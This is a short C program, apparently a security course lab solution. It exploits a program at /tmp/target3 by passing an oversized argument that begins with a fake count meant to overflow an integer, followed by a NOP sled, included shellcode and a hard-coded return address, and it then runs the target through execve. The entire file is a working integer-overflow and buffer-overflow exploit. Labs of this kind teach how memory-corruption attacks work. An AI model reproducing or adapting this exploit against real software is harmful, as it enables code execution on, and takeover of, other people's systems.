#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"
#define NOP 0x90
#define BUFFERSIZE 20020
#define FAKE_COUNT "2147484649,"
#define FAKE_RET 0xbfff61d9

int main(void)
{
  char *args[3];
  char *env[1];
  char buff[BUFFERSIZE];

  //initialize the whole buffer space with NOP character
  memset(buff,NOP,BUFFERSIZE);
  
  //insert the fake count number to overflow the integer
  char x[]=FAKE_COUNT;
  memcpy(buff,x,11);

  //inject the shellcode
  memcpy(buff+60,shellcode,strlen(shellcode));

  //insert the fake return address at the end of the string.
  *(int*)(buff+BUFFERSIZE-5)=FAKE_RET;
  buff[BUFFERSIZE-1]=0;

  args[0] = TARGET;
  args[1] = buff;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
